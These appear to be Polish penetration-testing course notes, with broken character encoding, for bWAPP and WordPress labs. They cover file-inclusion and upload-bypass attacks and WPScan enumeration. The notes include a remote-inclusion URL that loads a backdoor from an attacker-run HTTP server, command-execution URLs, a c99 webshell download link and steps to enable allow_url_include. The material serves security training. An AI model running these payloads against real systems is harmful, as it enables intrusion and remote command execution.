podsÅ‚uchaÄ‡ ruch w Burp
przekleiÄ‡ w url przeglÄ…darki zmieniajÄ…Ä‡ <ADRESBWAPPA> na swÃ³j:
    
http://<ADRESBWAPPA>/rlfi.php?language=php://filter/read=convert.base64-encode/resource=rlfi.php&action=go

***

ğŸ”— -- PrzykÅ‚adowe webshelle znajdziemy tutaj:
/usr/share/webshells

ğŸ”— -- Informacje o RFI
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md

### ğŸ“‹ â€“ Lab03 Remote File Inclusion
 
Backdora naleÅ¼y pobraÄ‡ z 
/usr/share/webshells/php

ğŸ”— -- Reverse Shell Cheat Sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://highon.coffee/blog/reverse-shell-cheat-sheet/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

#NaleÅ¼y uruchomiÄ‡ http server na jeden z 2 sposobÃ³w:
    python2.7  -m SimpleHTTPServer 9090
    python3 -m http.server 9090

w bWAPP naleÅ¼y wybraÄ‡ Remote &Local File Inclusion (RFI/LFI)
w url naleÅ¼y podmieniÄ‡ =ip:9090/nazwa_webshell.php zamiast jÄ™zyka 
$sprawdzamy nazwy/id obrazÃ³w dockera np: 6cbc6deaddc6:
    docker ps
    docker exec 6cbc6deaddc6 ls
    docker exec 6cbc6deaddc6 whoami

#wykonywanie komend na konkretnym dokerze o id 6cbc6deaddc6:
    docker exec -it 6cbc6deaddc6 /bin/bash
    cd /etc/php5/
    ls
    cd apache2/
    ls
    pwd
    vi php.ini
#zmieniamy w pliku php.ini poniÅ¼sze wartoÅ›ci:
     allow_url_fopen=on
     allow_url_include=on
#wyjÅ›cie:
    CTRL P + Q

II metoda edycji pliku:
#kopiujemy plik z kontenera (swÃ³j id kontenera):
    docker cp 6cbc6deaddc6:/etc/php5/apache2/php.ini /home/kali
nano php.ini (linka 816)
#zmieniamy w pliku php.ini poniÅ¼sze wartoÅ›ci:
    allow_url_fopen=on
    allow_url_include=on
#wgrywamy zmieniony plik do dockera:
    docker cp /home/kali/php.ini 6cbc6deaddc6:/etc/php5/apache2/php.ini
#sprawdzamy czy plik jest po zmianach:
    docker exec 6cbc6deaddc6 cat /etc/php5/apache2/php.ini | grep allow_url
#restart usÅ‚ugi Apache2:
    docker exec 6cbc6deaddc6 service apache2 restart 
    docker exec 6cbc6deaddc6 service apache2 status 
#NaleÅ¼y uruchomiÄ‡ http server:
    python3 -m http.server 9090
#wklejamy w bWAPP w url (zmiana ip na wÅ‚asny):
    http://172.16.2.148:9001/rlfi.php?language=http://172.16.2.148:9090/simple-backdoor.php&cmd=ls&action=go
    
### ğŸ“‹ â€“ Lab04 Restricted File Upload

ğŸ”— -- Reverse Shell C99
https://www.r57shell.net/single.php?id=13
https://www.r57shell.net/shells/c99.rar

    unrar x c99.rar


#Skorygowanie uprawnieÅ„ do docker images

    docker exec 6cbc6deaddc6 chmod 777 /var/www/html/images


bwapp / Unrestricted File Upload /

#Wykonujemy Upload c99.php
#OdwoÅ‚ujemy siÄ™ do pliku w przeglÄ…darce:
http://localhost:9000/images/c99.php

Poziom Medium

#Kopiujemy plik pod nowÄ… nazwÄ…, poniewaÅ¼ otrzymujemy komunikat

    Sorry, the file extension is not allowed. The following extensions are blocked: asp, aspx, dll, exe, jsp, php


c99.php3

#OdwoÅ‚ujemy siÄ™ do pliku w przeglÄ…darce:
http://localhost:9000/images/c99.php3

Poziom High

#Kopiujemy plik pod nowÄ… nazwÄ… poniewaÅ¼ otrzymujemy komunikat

    Sorry, the file extension is not allowed. Only the following extensions are allowed: jpg, png


# Uploadujemy shella simple-backdoor.php
http://localhost:9000/images/simple-backdoor.php.jpg

#Przechodzimy do / Remote & Local File Inclusion (RFI/LFI) / Poziom Low

#OdwoÅ‚ujemy siÄ™ do pliku z parametrem cmd=whoami w przeglÄ…darce:
http://localhost:9000/rlfi.php?language=images/simple-backdoor.php.jpg&cmd=whoami&action=go

***

### ğŸ“‹ â€“ Lab05 Adding Content to WordPress

Wordpress in Docker
https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/

service apache2 stop

mkdir wordpress
nano docker-compose.yml

services:
  db:
    # We use a mariadb image which supports both amd64 & arm64 architecture
    image: mariadb:10.6.4-focal
    # If you really want to use MySQL, uncomment the following line
    #image: mysql:8.0.27
    command: '--default-authentication-plugin=mysql_native_password'
    volumes:
      - db_data:/var/lib/mysql
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=somewordpress
      - MYSQL_DATABASE=wordpress
      - MYSQL_USER=wordpress
      - MYSQL_PASSWORD=wordpress
    expose:
      - 3306
      - 33060
  wordpress:
    image: wordpress:latest
    volumes:
      - wp_data:/var/www/html
    ports:
      - 80:80
    restart: always
    environment:
      - WORDPRESS_DB_HOST=db
      - WORDPRESS_DB_USER=wordpress
      - WORDPRESS_DB_PASSWORD=wordpress
      - WORDPRESS_DB_NAME=wordpress
volumes:
  db_data:
  wp_data:

apt update && apt install docker-compose
docker-compose up

PrzeglÄ…darka
http://localhost/wp-admin/install.php

    Dodajemy nowe teamty - Themes

    Dodajemy nowe wtyczki - Plugins np. Yoast SEO

    Dodajemy nowych uÅ¼ytkownikÃ³w w rÃ³Å¼nych rolach


#WyÅ›wietlenie zawartoÅ›ci pliku konfiguracyjnego wp-config.php

    docker exec 7e12c5052ec9 cat wp-config.php


***

### ğŸ“‹ â€“ Lab06 WPScan

wpscan --update
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

WordPress Security Scanner by the WPScan Team
                         Version 3.8.22

[i] Updating the Database ...
[i] Update completed.


Skanowanie Wordpress:


    Podstawowy skan

    wpscan --url http://localhost:80

    Enumeracja Themes i Plugins

    wpscan --url http://localhost:80 -e vp vt

    Enumeracja UÅ¼ytkownikÃ³w z ID od 1-5

    wpscan --url http://localhost:80 -e u1-5


***

[PT Flow, Reporting & Vulnerability Scanners]

ğŸ”— -- PTES Technical Guideline
http://www.pentest-standard.org/index.php/Main_Page

ğŸ”— -- OWASP Testing Guides
https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies#owasp-testing-guides

https://owasp.org/www-project-web-security-testing-guide/


ğŸ”— -- PrzykÅ‚adowe Raporty z pentestÃ³w
https://sekurak.pl/zobacz-pelen-nieocenzurowany-raport-z-testow-penetracyjnych-canal/

https://sekurak.pl/pelen-raport-z-prawdziwych-testow-bezpieczenstwa/

https://sekurak.pl/swiezy-raport-z-testow-penetracyjnych-w-sumie-30-podatnosci-zlokalizowanych-w-6-dni/

https://sekurak.pl/pelen-raport-z-realnych-testow-bezpieczenstwa-aplikacji-eventowej-bez-zadnej-cenzury/

ğŸ”— -- Common Vulnerability Scoring System Calculator
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator


### ğŸ“‹ â€“ Lab PT Report

Instalacja ZAP OWASP

    apt install zaproxy






